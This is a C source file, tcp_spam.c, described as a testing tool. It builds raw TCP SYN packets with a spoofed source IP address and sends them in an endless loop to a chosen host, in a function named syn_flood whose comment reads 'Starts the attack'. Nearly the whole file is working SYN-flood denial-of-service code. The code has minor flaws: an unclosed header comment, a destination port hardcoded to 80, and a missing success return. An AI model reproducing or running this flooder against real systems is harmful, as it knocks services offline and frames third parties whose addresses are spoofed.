/* =====================================================================================
 *
 *       Filename:  tcp_spam.c
 *
 *    Description:  A traffic injection tool for testing. This tool spams TCP SYNs to a 
 *                  specified host on a specified port as a specified source_ip
 *          Usage:  ./tcp_spam -p <port> -h <hostname> -s <source_ip> 
 *
 * =====================================================================================


#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <strings.h>
#include <string.h>
#include <fcntl.h>
#include <stdlib.h>
#include <errno.h>
#include "sock_config.h"
#include "syn_flood.h"


/* * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 * Simple checksum implementation
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
*/
unsigned short csum(unsigned short *ptr,int nbytes) 
{
    register long sum;
    unsigned short oddbyte;
    register short answer;
 
    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }
 
    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;
     
    return(answer);
}
/* * * * * * * * * * * * * * * * * * * * * * * * * * *
 * Configure the packet
 * * * * * * * * * * * * * * * * * * * * * * * * * * *
*/
struct iphdr* configure_packet(char* source_ip, char* datagram, struct sockaddr_in sin)
{
    struct iphdr* iph = (struct iphdr *) datagram;
    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
    struct csum_hdr psh;
	

    //fill in the IP header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr);
    iph->id = htons(54321);  //Id of this packet
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;      //Set to 0 before calculating checksum
    iph->saddr = inet_addr ( source_ip );    //Spoof the source ip address
    iph->daddr = sin.sin_addr.s_addr;
     
    iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
     
    //TCP Header
    tcph->source = htons (1234);
    tcph->dest = htons (80);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5;      /* first and only tcp segment */
    tcph->fin=0;
    tcph->syn=1;
    tcph->rst=0;
    tcph->psh=0;
    tcph->ack=0;
    tcph->urg=0;
    tcph->window = htons (5840); /* maximum allowed window size */
    tcph->check = 0;/* if you set a checksum to zero, your kernel's IP stack
                should fill in the correct checksum during transmission */
    tcph->urg_ptr = 0;
    //Now the IP checksum
     
    psh.source_addr = inet_addr( source_ip );
    psh.dest_addr = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(20);
     
    memcpy(&psh.tcp , tcph , sizeof (struct tcphdr));
     
    tcph->check = csum( (unsigned short*) &psh , sizeof (struct csum_hdr)); 
    return iph;
}

/* * * * * * * * * * * * * * * * * * * * * * * * * * *
 * Sends the TCP packet
 * * * * * * * * * * * * * * * * * * * * * * * * * * *
*/
int tcp_send(char *datagram, int sfd, struct sockaddr_in servaddr, struct iphdr* iph)
{
    if (sendto(sfd, datagram, iph->tot_len, 0, (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0){
        perror("cannot send message");
        return -1;
    }
}

/* * * * * * * * * * * * * * * * * * * * * * * * * * *
 * Starts the attack
 * * * * * * * * * * * * * * * * * * * * * * * * * * *
*/
void syn_flood(char* hostname, int port, char* source_ip)
{
    //create the UDP socket
    int sfd;
    char datagram[4096];
    struct sockaddr_in servaddr;
    
    sfd = get_tcp_sock_fd();
    //configure the socket
    servaddr = configure_sock(port, hostname);
    //create the ip header
    struct iphdr* iph = configure_packet(source_ip, datagram, servaddr);
    
    int one = 1;
    const int *val = &one;
    if (setsockopt (sfd, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0) {
        printf("Error setting IP_HDRINCL. Err : %d . Error msg: %s\n", errno, strerror(errno));
        exit(0);
    }
    //start spamming
    while(1) {
        tcp_send(datagram, sfd, servaddr, iph);
    }
    close(sfd);
}

